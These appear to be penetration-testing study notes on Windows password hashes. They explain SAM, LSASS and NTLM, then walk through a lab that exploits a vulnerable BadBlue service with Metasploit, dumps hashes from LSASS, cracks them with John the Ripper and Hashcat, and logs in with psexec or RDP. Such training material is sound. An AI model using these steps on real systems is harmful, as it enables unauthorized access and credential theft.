## Windows Password Hashes
* **Where do the Windows OS stores hashes user account and passwords locally??**
  * In the SAM (Security Accounts Manager) database.
 
* **Can SAM DB file can be copied while the OS is running?**
  * No, not possible.
 
* **If Windows NT kernel keeps the SAM DB file locked, then how attackers can exploit it?**
  * They utilize in-memory techniques and tools to dump SAM hashes from the LSASS (Local Authority Sub System) process.
 
* **How SAM DB is protected in the modern versions of Windows?**
  * The SAM DB is encrypted with a syskey in the modern versions.
  * To make its exploitation tougher, elevated/ administrative privileges are required in order to access and interact with the LSASS process 
 
* **What is hashing**
  * The process of converting a piece of data into another value.
  * A hashing function or algortihm is used to generate the new value.
  * The result of hashing algorithm is known as hash or hash value.
 
* **What does Local Security Authority (LSA) facilitate?**
  * It facilitates authentication and verification of credentials.
 
* **What are different types of hashes?**
  * Windows versions up to Winodws server 2003 utilizes two different types of hashes:
    1. LM (Disabled from Windows Vista onwards)
    2. NTLM
   
* **What is NTLM?**  
  * A collection of authentication protocols that are utilized in Windows to facilitate authentication between two computers.
  * Authentication is done with username and password.
 
* **MD4 hashing algorithm is used to encrypt the original password and dispose it off to create which hash?**
  * The hash which it creates is called NTLM hash.
 
* **How is ti different from the LM hash?**
  * Does not split the hash in two chunks
  * Case sensitive
  * Allows th euse of symbols and unicode characters.
 
* **Which different techniques cna be used to dump the hashes?**
  * The in-built meterpreter "hashdump" command
  * Mimikatz
 
* **Once we got access to the hashes, how can we use those hashes**
  * John the ripper
  * Hashcat
 
* PRACTICAL
* As the target is running the vulnerable BadBlue2.7 service
* `use exploit/windows/http/badblue_passthru` --> Meterpreter session
* `pgrep lsass`
* `migrate [Process ID]`
* `hashdump` --> Copy the hashes
* `exit`
* On attacker's machine:
* `vim hashes.txt`
* Paste the hashes here and save.
* To read the documentation for "John The Ripper" --> `john`
* To list the formats that can be broken with John The Ripper: `john --list=formats`
* We are after the NTLM format, which is refferred to as "NT" in this list
* `john --list=formats | grep NT` --> and we cna chose one of the formats in this list
* Next we can also mention a wordlist to perform a brute-force attack. If no wordlist is provided, then John uses its default wordlist
* `john --format=NT hashes.txt [--wordlist=fileName , Optional]`
* This will reveal the plain-text passwords
* Even if the plain-text passwords were not found due to some reason, we could have utilized psexec utility to exploit NTLM hashes directly.

* ***
* To use the wordlist, we have got a sample wordlist, which we need to decompress
* `gzip -d [path of the zipped file to be decompressed]`
* By default, there is a wordlist pre-packaged with Kali Linux, which is stored under `usr/share/wordlists/rockyou.txt.gz`
* So we can also use this text file, if there was some issue without using a wordlist:
* `john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`

***
* **Using Hashcat to exploit the hashes**
* `hashcat --help` -->As we are after exploiting the NTLm, we have to look for the ID of the NTLM in this documentation, which is 1000 in this case.
* `hashcat -a3 -m [NTLM ID] hashes.txt /usr/share/wordlists/rockyou.txt` --> Where -a is the attack type and everything is mentioned in the help section.

* We can utilize these hashes or plain-text passwords via psexec utility, psexec python script or psexec module in MSF.
* these can also be utilized if RDP is running on the target. We can uathenticate through RDP (port 3389) in that case.
* `xfreerdp /u:[username] /p:[password] /v:[target IP]`
